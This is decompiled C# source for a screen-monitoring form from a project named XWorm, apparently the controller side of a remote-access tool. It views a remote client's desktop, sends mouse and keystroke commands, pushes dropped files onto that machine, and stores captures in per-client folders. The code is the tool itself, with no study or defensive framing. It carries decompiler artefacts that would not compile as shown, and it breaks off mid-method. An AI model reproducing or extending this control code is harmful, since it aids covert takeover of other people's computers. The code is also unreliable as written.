#define DEBUG
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;


namespace XWorm;

[DesignerGenerated]
public class RemoteDesktop : Form
{
	[CompilerGenerated]
	internal sealed class _Closure_0024__R97_002D14
	{
		public GClass5 _0024VB_0024NonLocal_2;

		public _Closure_0024__R97_002D14(_Closure_0024__R97_002D14 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024NonLocal_2 = arg0._0024VB_0024NonLocal_2;
			}
		}

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R16(object a0)
		{
			_0024VB_0024NonLocal_2.method_1((byte[])a0);
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private System.Windows.Forms.Timer _Timer1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer2")]
	private System.Windows.Forms.Timer _Timer2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripStatusLabel2")]
	private ToolStripStatusLabel _ToolStripStatusLabel2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripStatusLabel3")]
	private ToolStripStatusLabel _ToolStripStatusLabel3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripStatusLabel4")]
	private ToolStripStatusLabel _ToolStripStatusLabel4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripStatusLabel5")]
	private ToolStripStatusLabel _ToolStripStatusLabel5;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton1")]
	private Guna2GradientButton _Guna2GradientButton1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ToolStripStatusLabel6")]
	private ToolStripStatusLabel _ToolStripStatusLabel6;

	public GClass5 gclass5_0;

	public string string_0;

	public Size size_0;

	public Point point_0;

	public int int_0;

	public Stopwatch stopwatch_0;

	public List<Keys> keyses_0;

	public System.Windows.Forms.Timer Timer1
		;

	[field: AccessedThroughProperty("StatusStrip1")]
	public StatusStrip StatusStrip1
	;

	[field: AccessedThroughProperty("ToolStripStatusLabel1")]
	public ToolStripStatusLabel ToolStripStatusLabel1
	;

	public System.Windows.Forms.Timer Timer2
	;

	public ToolStripStatusLabel ToolStripStatusLabel2
	;
	public ToolStripStatusLabel ToolStripStatusLabel3
;

	public ToolStripStatusLabel ToolStripStatusLabel4
	;

	public ToolStripStatusLabel ToolStripStatusLabel5
;

	[field: AccessedThroughProperty("Panel2")]
	public Panel Panel2
;

	public Guna2GradientButton Guna2GradientButton1
	;

	[field: AccessedThroughProperty("Guna2ComboBox1")]
	public Guna2ComboBox Guna2ComboBox1
	;

	public PictureBox PictureBox1
	;

	[field: AccessedThroughProperty("Guna2Panel1")]
	public Guna2Panel Guna2Panel1
	;

	[field: AccessedThroughProperty("Guna2Panel3")]
	public Guna2Panel Guna2Panel3
	;

	[field: AccessedThroughProperty("Guna2Panel2")]
	public Guna2Panel Guna2Panel2
;

	[field: AccessedThroughProperty("Guna2ComboBox2")]
	public Guna2ComboBox Guna2ComboBox2
	;

	public ToolStripStatusLabel ToolStripStatusLabel6
	;

	public RemoteDesktop()
	{
		base.Load += RemoteDesktop_Load;
		base.Closing += RemoteDesktop_Closing;
		base.FormClosing += RemoteDesktop_FormClosing;
		point_0 = new Point(1, 1);
		int_0 = 0;
		stopwatch_0 = Stopwatch.StartNew();
		keyses_0 = new List<Keys>();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
            this.components = new System.ComponentModel.Container();
            this.Timer1 = new System.Windows.Forms.Timer(this.components);
            this.StatusStrip1 = new System.Windows.Forms.StatusStrip();
            this.ToolStripStatusLabel2 = new System.Windows.Forms.ToolStripStatusLabel();
            this.ToolStripStatusLabel6 = new System.Windows.Forms.ToolStripStatusLabel();
            this.ToolStripStatusLabel3 = new System.Windows.Forms.ToolStripStatusLabel();
            this.ToolStripStatusLabel4 = new System.Windows.Forms.ToolStripStatusLabel();
            this.ToolStripStatusLabel5 = new System.Windows.Forms.ToolStripStatusLabel();
            this.ToolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
            this.Timer2 = new System.Windows.Forms.Timer(this.components);
            this.Panel2 = new System.Windows.Forms.Panel();
            this.Guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
            this.Guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.Guna2ComboBox1 = new Guna.UI2.WinForms.Guna2ComboBox();
            this.Guna2Panel3 = new Guna.UI2.WinForms.Guna2Panel();
            this.Guna2ComboBox2 = new Guna.UI2.WinForms.Guna2ComboBox();
            this.Guna2Panel2 = new Guna.UI2.WinForms.Guna2Panel();
            this.PictureBox1 = new System.Windows.Forms.PictureBox();
            this.StatusStrip1.SuspendLayout();
            this.Panel2.SuspendLayout();
            this.Guna2Panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // Timer1
            // 
            this.Timer1.Enabled = true;
            this.Timer1.Interval = 1000;
            // 
            // StatusStrip1
            // 
            this.StatusStrip1.BackColor = System.Drawing.Color.White;
            this.StatusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.StatusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.ToolStripStatusLabel2,
            this.ToolStripStatusLabel6,
            this.ToolStripStatusLabel3,
            this.ToolStripStatusLabel4,
            this.ToolStripStatusLabel5,
            this.ToolStripStatusLabel1});
            this.StatusStrip1.Location = new System.Drawing.Point(0, 342);
            this.StatusStrip1.Name = "StatusStrip1";
            this.StatusStrip1.Padding = new System.Windows.Forms.Padding(1, 0, 9, 0);
            this.StatusStrip1.Size = new System.Drawing.Size(586, 22);
            this.StatusStrip1.TabIndex = 7;
            this.StatusStrip1.Text = "StatusStrip1";
            // 
            // ToolStripStatusLabel2
            // 
            this.ToolStripStatusLabel2.ActiveLinkColor = System.Drawing.Color.Red;
            this.ToolStripStatusLabel2.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ToolStripStatusLabel2.ForeColor = System.Drawing.Color.Black;
            this.ToolStripStatusLabel2.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(255)))));
            this.ToolStripStatusLabel2.Name = "ToolStripStatusLabel2";
            this.ToolStripStatusLabel2.Size = new System.Drawing.Size(64, 17);
            this.ToolStripStatusLabel2.Text = "[ Mouse ]";
            this.ToolStripStatusLabel2.VisitedLinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(128)))), ((int)(((byte)(0)))), ((int)(((byte)(128)))));
            this.ToolStripStatusLabel2.Click += new System.EventHandler(this.ToolStripStatusLabel2_Click);
            // 
            // ToolStripStatusLabel6
            // 
            this.ToolStripStatusLabel6.ActiveLinkColor = System.Drawing.Color.Red;
            this.ToolStripStatusLabel6.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ToolStripStatusLabel6.ForeColor = System.Drawing.Color.Black;
            this.ToolStripStatusLabel6.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(255)))));
            this.ToolStripStatusLabel6.Name = "ToolStripStatusLabel6";
            this.ToolStripStatusLabel6.Size = new System.Drawing.Size(97, 17);
            this.ToolStripStatusLabel6.Text = "[ MouseMove ]";
            this.ToolStripStatusLabel6.VisitedLinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(128)))), ((int)(((byte)(0)))), ((int)(((byte)(128)))));
            this.ToolStripStatusLabel6.Click += new System.EventHandler(this.ToolStripStatusLabel6_Click);
            // 
            // ToolStripStatusLabel3
            // 
            this.ToolStripStatusLabel3.ActiveLinkColor = System.Drawing.Color.Red;
            this.ToolStripStatusLabel3.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ToolStripStatusLabel3.ForeColor = System.Drawing.Color.Black;
            this.ToolStripStatusLabel3.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(255)))));
            this.ToolStripStatusLabel3.Name = "ToolStripStatusLabel3";
            this.ToolStripStatusLabel3.Size = new System.Drawing.Size(81, 17);
            this.ToolStripStatusLabel3.Text = "[ Keyboard ]";
            this.ToolStripStatusLabel3.VisitedLinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(128)))), ((int)(((byte)(0)))), ((int)(((byte)(128)))));
            this.ToolStripStatusLabel3.Click += new System.EventHandler(this.ToolStripStatusLabel3_Click);
            // 
            // ToolStripStatusLabel4
            // 
            this.ToolStripStatusLabel4.ActiveLinkColor = System.Drawing.Color.Red;
            this.ToolStripStatusLabel4.ForeColor = System.Drawing.Color.Black;
            this.ToolStripStatusLabel4.LinkColor = System.Drawing.Color.White;
            this.ToolStripStatusLabel4.Name = "ToolStripStatusLabel4";
            this.ToolStripStatusLabel4.Size = new System.Drawing.Size(71, 17);
            this.ToolStripStatusLabel4.Text = "[ AutoSave ]";
            this.ToolStripStatusLabel4.VisitedLinkColor = System.Drawing.Color.White;
            this.ToolStripStatusLabel4.Click += new System.EventHandler(this.ToolStripStatusLabel4_Click);
            // 
            // ToolStripStatusLabel5
            // 
            this.ToolStripStatusLabel5.ActiveLinkColor = System.Drawing.Color.Red;
            this.ToolStripStatusLabel5.ForeColor = System.Drawing.Color.Black;
            this.ToolStripStatusLabel5.LinkColor = System.Drawing.Color.White;
            this.ToolStripStatusLabel5.Name = "ToolStripStatusLabel5";
            this.ToolStripStatusLabel5.Size = new System.Drawing.Size(65, 17);
            this.ToolStripStatusLabel5.Text = "[ Window ]";
            this.ToolStripStatusLabel5.VisitedLinkColor = System.Drawing.Color.White;
            this.ToolStripStatusLabel5.Click += new System.EventHandler(this.ToolStripStatusLabel5_Click);
            // 
            // ToolStripStatusLabel1
            // 
            this.ToolStripStatusLabel1.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ToolStripStatusLabel1.ForeColor = System.Drawing.Color.Black;
            this.ToolStripStatusLabel1.Name = "ToolStripStatusLabel1";
            this.ToolStripStatusLabel1.Size = new System.Drawing.Size(14, 17);
            this.ToolStripStatusLabel1.Text = "..";
            // 
            // Timer2
            // 
            this.Timer2.Interval = 300;
            this.Timer2.Tick += new System.EventHandler(this.Timer2_Tick);
            // 
            // Panel2
            // 
            this.Panel2.Controls.Add(this.Guna2Panel1);
            this.Panel2.Controls.Add(this.Guna2Panel3);
            this.Panel2.Controls.Add(this.Guna2ComboBox2);
            this.Panel2.Controls.Add(this.Guna2Panel2);
            this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
            this.Panel2.Location = new System.Drawing.Point(0, 0);
            this.Panel2.Name = "Panel2";
            this.Panel2.Size = new System.Drawing.Size(586, 38);
            this.Panel2.TabIndex = 29;
            // 
            // Guna2Panel1
            // 
            this.Guna2Panel1.Controls.Add(this.Guna2GradientButton1);
            this.Guna2Panel1.Controls.Add(this.Guna2ComboBox1);
            this.Guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
            this.Guna2Panel1.Location = new System.Drawing.Point(48, 0);
            this.Guna2Panel1.Name = "Guna2Panel1";
            this.Guna2Panel1.Size = new System.Drawing.Size(355, 21);
            this.Guna2Panel1.TabIndex = 35;
            // 
            // Guna2GradientButton1
            // 
            this.Guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.Guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.Guna2GradientButton1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Guna2GradientButton1.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(192)))), ((int)(((byte)(182)))));
            this.Guna2GradientButton1.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2GradientButton1.ForeColor = System.Drawing.Color.White;
            this.Guna2GradientButton1.Image = global::XWorm_Resources._Stop;
            this.Guna2GradientButton1.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
            this.Guna2GradientButton1.ImageSize = new System.Drawing.Size(15, 15);
            this.Guna2GradientButton1.Location = new System.Drawing.Point(0, 0);
            this.Guna2GradientButton1.Name = "Guna2GradientButton1";
            this.Guna2GradientButton1.Size = new System.Drawing.Size(265, 21);
            this.Guna2GradientButton1.TabIndex = 34;
            this.Guna2GradientButton1.Text = "OFF";
            this.Guna2GradientButton1.Click += new System.EventHandler(this.Guna2GradientButton1_Click);
            // 
            // Guna2ComboBox1
            // 
            this.Guna2ComboBox1.BackColor = System.Drawing.Color.Transparent;
            this.Guna2ComboBox1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(192)))), ((int)(((byte)(182)))));
            this.Guna2ComboBox1.Dock = System.Windows.Forms.DockStyle.Right;
            this.Guna2ComboBox1.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.Guna2ComboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.Guna2ComboBox1.FocusedColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(192)))), ((int)(((byte)(182)))));
            this.Guna2ComboBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(192)))), ((int)(((byte)(182)))));
            this.Guna2ComboBox1.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Guna2ComboBox1.ForeColor = System.Drawing.Color.Black;
            this.Guna2ComboBox1.ItemHeight = 15;
            this.Guna2ComboBox1.Items.AddRange(new object[] {
            "10%",
            "20%",
            "30%",
            "40%",
            "50%",
            "60%",
            "70%",
            "80%",
            "90%",
            "100%"});
            this.Guna2ComboBox1.Location = new System.Drawing.Point(265, 0);
            this.Guna2ComboBox1.Name = "Guna2ComboBox1";
            this.Guna2ComboBox1.Size = new System.Drawing.Size(90, 21);
            this.Guna2ComboBox1.TabIndex = 28;
            // 
            // Guna2Panel3
            // 
            this.Guna2Panel3.Dock = System.Windows.Forms.DockStyle.Left;
            this.Guna2Panel3.Location = new System.Drawing.Point(0, 0);
            this.Guna2Panel3.Name = "Guna2Panel3";
            this.Guna2Panel3.Size = new System.Drawing.Size(48, 38);
            this.Guna2Panel3.TabIndex = 37;
            // 
            // Guna2ComboBox2
            // 
            this.Guna2ComboBox2.BackColor = System.Drawing.Color.Transparent;
            this.Guna2ComboBox2.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(192)))), ((int)(((byte)(182)))));
            this.Guna2ComboBox2.Dock = System.Windows.Forms.DockStyle.Right;
            this.Guna2ComboBox2.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.Guna2ComboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.Guna2ComboBox2.FocusedColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(192)))), ((int)(((byte)(182)))));
            this.Guna2ComboBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(192)))), ((int)(((byte)(182)))));
            this.Guna2ComboBox2.Font = new System.Drawing.Font("Segoe UI", 8.25F);
            this.Guna2ComboBox2.ForeColor = System.Drawing.Color.Black;
            this.Guna2ComboBox2.ItemHeight = 15;
            this.Guna2ComboBox2.Location = new System.Drawing.Point(403, 0);
            this.Guna2ComboBox2.Name = "Guna2ComboBox2";
            this.Guna2ComboBox2.Size = new System.Drawing.Size(135, 21);
            this.Guna2ComboBox2.TabIndex = 38;
            // 
            // Guna2Panel2
            // 
            this.Guna2Panel2.Dock = System.Windows.Forms.DockStyle.Right;
            this.Guna2Panel2.Location = new System.Drawing.Point(538, 0);
            this.Guna2Panel2.Name = "Guna2Panel2";
            this.Guna2Panel2.Size = new System.Drawing.Size(48, 38);
            this.Guna2Panel2.TabIndex = 36;
            // 
            // PictureBox1
            // 
            this.PictureBox1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.PictureBox1.ErrorImage = null;
            this.PictureBox1.InitialImage = null;
            this.PictureBox1.Location = new System.Drawing.Point(0, 38);
            this.PictureBox1.Margin = new System.Windows.Forms.Padding(2);
            this.PictureBox1.Name = "PictureBox1";
            this.PictureBox1.Size = new System.Drawing.Size(586, 304);
            this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.PictureBox1.TabIndex = 2;
            this.PictureBox1.TabStop = false;
            this.PictureBox1.KeyUp += new System.Windows.Forms.KeyEventHandler(this.PictureBox1_KeyUp);
            this.PictureBox1.KeyDown += new System.Windows.Forms.KeyEventHandler(this.PictureBox1_KeyDown);
            this.PictureBox1.Click += new System.EventHandler(this.PictureBox1_Click);
            this.PictureBox1.DragDrop += new System.Windows.Forms.DragEventHandler(this.PictureBox1_DragDrop);
            this.PictureBox1.DragEnter += new System.Windows.Forms.DragEventHandler(this.PictureBox1_DragEnter);
            this.PictureBox1.MouseDown += new System.Windows.Forms.MouseEventHandler(this.PictureBox1_MouseDown);
            this.PictureBox1.MouseMove += new System.Windows.Forms.MouseEventHandler(this.PictureBox1_MouseMove);
            this.PictureBox1.MouseUp += new System.Windows.Forms.MouseEventHandler(this.PictureBox1_MouseUp);
            // 
            // RemoteDesktop
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.White;
            this.ClientSize = new System.Drawing.Size(586, 364);
            this.Controls.Add(this.PictureBox1);
            this.Controls.Add(this.Panel2);
            this.Controls.Add(this.StatusStrip1);
            this.Name = "RemoteDesktop";
            this.Text = "Monitor";
            this.StatusStrip1.ResumeLayout(false);
            this.StatusStrip1.PerformLayout();
            this.Panel2.ResumeLayout(false);
            this.Guna2Panel1.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox1)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

	}

	private void RemoteDesktop_Load(object sender, EventArgs e)
	{
		base.MouseWheel += RemoteDesktop_MouseWheel;
		keyses_0 = new List<Keys>();
		PictureBox1.AllowDrop = true;
		try
		{
			Timer2.Start();
			Guna2GradientButton1.PerformClick();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void RemoteDesktop_MouseWheel(object sender, MouseEventArgs e)
	{
		if (!(ToolStripStatusLabel2.ForeColor == Color.Green) || Operators.CompareString(Guna2GradientButton1.Text, "Capturing...", TextCompare: false) != 0)
		{
			return;
		}
		if (e.Delta < 0)
		{
			byte[] array = Module0.smethod_6("ScrollDown");
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
		else
		{
			byte[] array2 = Module0.smethod_6("ScrollUp");
			GClass5 gClass2 = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass2.method_1((byte[])a0);
			}, array2);
		}
	}

	private void RemoteDesktop_Closing(object sender, CancelEventArgs e)
	{
		Guna2GradientButton1.Text = "OFF";
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!gclass5_0.bool_0)
			{
				Close();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		try
		{
			ToolStripStatusLabel1.Text = "Size :" + PictureBox1.Width + "x" + PictureBox1.Height;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void PictureBox1_Click(object sender, EventArgs e)
	{
		PictureBox1.Focus();
	}

	private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
	{
		if (ToolStripStatusLabel2.ForeColor == Color.Green && Operators.CompareString(Guna2GradientButton1.Text, "Capturing...", TextCompare: false) == 0)
		{
			Point point = checked(new Point((int)Math.Round((double)e.X * ((double)size_0.Width / (double)PictureBox1.Width)), (int)Math.Round((double)e.Y * ((double)size_0.Height / (double)PictureBox1.Height))));
			int num = default(int);
			if (e.Button == MouseButtons.Left)
			{
				num = 4;
			}
			if (e.Button == MouseButtons.Right)
			{
				num = 16;
			}
			byte[] array = Module0.smethod_6("Click" + GClass19.string_0 + Conversions.ToString(point.X) + GClass19.string_0 + Conversions.ToString(point.Y) + GClass19.string_0 + Conversions.ToString(num));
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
	}

	private void PictureBox1_MouseMove(object sender, MouseEventArgs e)
	{
		if (((ToolStripStatusLabel2.ForeColor == Color.Green) & (ToolStripStatusLabel6.ForeColor == Color.Green)) && Operators.CompareString(Guna2GradientButton1.Text, "Capturing...", TextCompare: false) == 0)
		{
			Point point = checked(new Point((int)Math.Round((double)e.X * ((double)size_0.Width / (double)PictureBox1.Width)), (int)Math.Round((double)e.Y * ((double)size_0.Height / (double)PictureBox1.Height))));
			if (point != point_0)
			{
				point_0 = point;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		if (ToolStripStatusLabel2.ForeColor == Color.Green && Operators.CompareString(Guna2GradientButton1.Text, "Capturing...", TextCompare: false) == 0)
		{
			Point point = checked(new Point((int)Math.Round((double)e.X * ((double)size_0.Width / (double)PictureBox1.Width)), (int)Math.Round((double)e.Y * ((double)size_0.Height / (double)PictureBox1.Height))));
			int num = default(int);
			if (e.Button == MouseButtons.Left)
			{
				num = 2;
			}
			if (e.Button == MouseButtons.Right)
			{
				num = 8;
			}
			byte[] array = Module0.smethod_6("Click" + GClass19.string_0 + Conversions.ToString(point.X) + GClass19.string_0 + Conversions.ToString(point.Y) + GClass19.string_0 + Conversions.ToString(num));
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
	}

	private void ToolStripStatusLabel2_Click(object sender, EventArgs e)
	{
		if (ToolStripStatusLabel2.ForeColor == Color.Green)
		{
			ToolStripStatusLabel2.ForeColor = Color.Black;
			ToolStripStatusLabel6.ForeColor = Color.Black;
		}
		else
		{
			ToolStripStatusLabel2.ForeColor = Color.Green;
		}
	}

	private void ToolStripStatusLabel3_Click(object sender, EventArgs e)
	{
		if (ToolStripStatusLabel3.ForeColor == Color.Green)
		{
			ToolStripStatusLabel3.ForeColor = Color.Black;
			return;
		}
		PictureBox1.Focus();
		ToolStripStatusLabel3.ForeColor = Color.Green;
	}

	private bool method_0(Keys key)
	{
		return (key & Keys.Capital) == Keys.Capital || (key & Keys.NumLock) == Keys.NumLock || (key & Keys.Scroll) == Keys.Scroll;
	}

	private void PictureBox1_KeyUp(object sender, KeyEventArgs e)
	{
		if (ToolStripStatusLabel3.ForeColor == Color.Green && Operators.CompareString(Guna2GradientButton1.Text, "Capturing...", TextCompare: false) == 0)
		{
			if (!method_0(e.KeyCode))
			{
				e.Handled = true;
			}
			keyses_0.Remove(e.KeyCode);
			byte[] array = Module0.smethod_6("Key" + GClass19.string_0 + Conversions.ToString((int)e.KeyCode) + GClass19.string_0 + "False");
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
	}

	private void PictureBox1_KeyDown(object sender, KeyEventArgs e)
	{
		if (!(ToolStripStatusLabel3.ForeColor == Color.Green) || Operators.CompareString(Guna2GradientButton1.Text, "Capturing...", TextCompare: false) != 0)
		{
			return;
		}
		if (!method_0(e.KeyCode))
		{
			e.Handled = true;
		}
		if (!keyses_0.Contains(e.KeyCode))
		{
			keyses_0.Add(e.KeyCode);
			byte[] array = Module0.smethod_6("Key" + GClass19.string_0 + Conversions.ToString((int)e.KeyCode) + GClass19.string_0 + "True");
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
	}

	private void ToolStripStatusLabel4_Click(object sender, EventArgs e)
	{
		if (ToolStripStatusLabel4.ForeColor == Color.Green)
		{
			ToolStripStatusLabel4.ForeColor = Color.Black;
			return;
		}
		try
		{
			string text = Path.Combine(Application.StartupPath, "ClientsFolder", string_0, "Monitor");
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			Process.Start(text);
			ToolStripStatusLabel4.ForeColor = Color.Green;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			MessageBox.Show(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void RemoteDesktop_FormClosing(object sender, FormClosingEventArgs e)
	{
		byte[] array = Module0.smethod_6("CloseScreen");
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}

	private void ToolStripStatusLabel5_Click(object sender, EventArgs e)
	{
		if (ToolStripStatusLabel5.ForeColor == Color.Green)
		{
			ToolStripStatusLabel5.ForeColor = Color.Black;
			ToolStripStatusLabel2.Visible = true;
			ToolStripStatusLabel6.Visible = true;
			ToolStripStatusLabel3.Visible = true;
		}
		else
		{
			ToolStripStatusLabel5.ForeColor = Color.Green;
			ToolStripStatusLabel2.ForeColor = Color.Black;
			ToolStripStatusLabel6.ForeColor = Color.Black;
			ToolStripStatusLabel3.ForeColor = Color.Black;
			ToolStripStatusLabel2.Visible = false;
			ToolStripStatusLabel6.Visible = false;
			ToolStripStatusLabel3.Visible = false;
		}
	}

	private void PictureBox1_DragEnter(object sender, DragEventArgs e)
	{
		if (e.Data.GetDataPresent(DataFormats.FileDrop))
		{
			e.Effect = DragDropEffects.Copy;
		}
	}

	private void PictureBox1_DragDrop(object sender, DragEventArgs e)
	{
		string[] array = (string[])(object)(string)e.Data.GetData(DataFormats.FileDrop);
		_Closure_0024__R97_002D14 closure_0024__R97_002D = default(_Closure_0024__R97_002D14);
		foreach (string path in array)
		{
			if (File.Exists(path))
			{
				byte[] array2 = Module0.smethod_6("DeskDrop" + GClass19.string_0 + Path.GetFileName(path) + GClass19.string_0 + Convert.ToBase64String(Module0.smethod_9(File.ReadAllBytes(path))));
				closure_0024__R97_002D = new _Closure_0024__R97_002D14(closure_0024__R97_002D);
				closure_0024__R97_002D._0024VB_0024NonLocal_2 = gclass5_0;
				ThreadPool.QueueUserWorkItem(closure_0024__R97_002D._Lambda_0024__R16, array2);
			}
		}
	}

	private void Guna2GradientButton1_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(Guna2GradientButton1.Text, "OFF", TextCompare: false) == 0)
		{
			Guna2GradientButton1.Text = "Capturing...";
			Guna2GradientButton1.Image = XWorm_Resources._Stop;
			byte[] array = Module0.smethod_6("RD+" + GClass19.string_0 + PictureBox1.Width + GClass19.string_0 + PictureBox1.Height + GClass19.string_0 + Guna2ComboBox1.Text.Replace("%", "").ToString() + GClass19.string_0 + Guna2ComboBox2.SelectedIndex);
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
		}
		else
		{
			Guna2GradientButton1.Text = "OFF";
			Guna2GradientButton1.Image = XWorm_Resources.Play;
		}
	}

	private void ToolStripStatusLabel6_Click(object sender, EventArgs e)
	{
		if (ToolStripStatusLabel6.ForeColor == Color.Green)
		{
